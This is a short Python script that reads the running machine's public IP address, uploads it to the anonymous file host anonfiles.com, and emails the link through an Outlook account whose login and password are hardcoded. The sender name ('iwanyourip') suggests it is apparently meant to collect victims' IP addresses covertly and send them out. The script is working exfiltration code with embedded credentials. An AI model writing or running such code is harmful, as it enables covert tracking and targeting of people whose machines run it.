import requests
import json
import smtplib
import ssl

# Get public IP address
ip = requests.get('https://api.ipify.org').text

# Upload IP address to anonfiles.com
url = 'https://api.anonfiles.com/upload'
payload = {'file': ('ip_address.txt', ip)}
response = requests.post(url, files=payload)

# Parse the response JSON
response_data = json.loads(response.text)
if response_data['status']:
    file_url = response_data['data']['file']['url']['short']
    print(f'IP address uploaded to {file_url}')
    
    # Send email with file URL
    port = 587  # For SSL
    smtp_server = "smtp-mail.outlook.com"
    sender_email = "iwanyourip@outlook.com"
    receiver_email = "yurakovtun93@gmail.com"
    password = "ipaddress123"
    message = f"""\
    Subject: IP address uploaded to anonfiles.com

    Your IP address has been uploaded to anonfiles.com. You can download the file using the following link: {file_url}"""

    context = ssl.create_default_context()
    with smtplib.SMTP(smtp_server, port) as server:
        server.starttls(context=context)
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message)
        

